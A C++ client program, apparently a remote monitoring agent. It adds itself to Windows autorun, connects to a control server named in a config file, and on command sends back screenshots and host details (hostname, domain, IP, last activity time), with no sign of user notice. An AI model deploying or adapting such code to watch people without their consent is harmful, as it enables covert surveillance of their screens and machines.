#include <iostream>
#include "Client.h"
#include "ConfigReader.h"
#include "OS.h"
#include "Screenshoter.h"

using namespace std;

string server_ip;
int server_port;
string host_ip;

string screenshot_dir;
string host_name;
string host_domain_name;
string lastActiveTime;
TCPClient* client;

void sendScreenshot() {
    Screenshoter scrsht;
    unsigned int size = 0;
    string screen_path = scrsht.makeScreenshot(screenshot_dir);
    char* data = scrsht.screenshotToMemory(screen_path, &size);
    Sleep(2); client->sendMessage(to_string(size)); // отправили размер
    Sleep(2); client->receiveMessage();             // получили размер
    Sleep(2); client->sendMessage(data, size);      // отправили фото
    scrsht.freeMemory(data);                        // выгрузили из памяти фото
}

void useConfig(string path) {
    ConfigReader cr;
    auto conf = cr.read(path);

    server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
    server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
    screenshot_dir = conf["screenshot_dir"];
    host_name = OS::getPCName();
    host_domain_name = OS::getPCDomain();
    lastActiveTime = OS::getLastUserActivityTime();
    host_ip = OS::getHostIp();

    if (host_domain_name.length() == 0) {
        host_domain_name = "no domain";
    }
}

void sendState() {
    string info = "";
    info += "hostname: " + host_name + "\n";
    info += "domain: " + host_domain_name + "\n";
    info += "last_activ_time: " + OS::getLastUserActivityTime() + "\n";
    info += "ip: " + host_ip + "\n";
    client->sendMessage(info);
}

int main() {

    client = nullptr;
    OS::addProgramToAutorun("Exe", OS::getExecProgramPath());
    useConfig("config.txt");
   
    while (true) {
        try {
            client = new TCPClient(server_ip, server_port);
            client->connect();
        } catch (exception) {
            if (client != nullptr)
                delete client;
            continue;
        }

        while (true) {
            try {
                string command = client->receiveMessage();
                if (command == "GET_SCREENSHOT")
                    sendScreenshot();
                else if (command == "GET_STATE") 
                    sendState();
            }
            catch (exception e) {
                delete client;
                break;
            }
        }

    }
}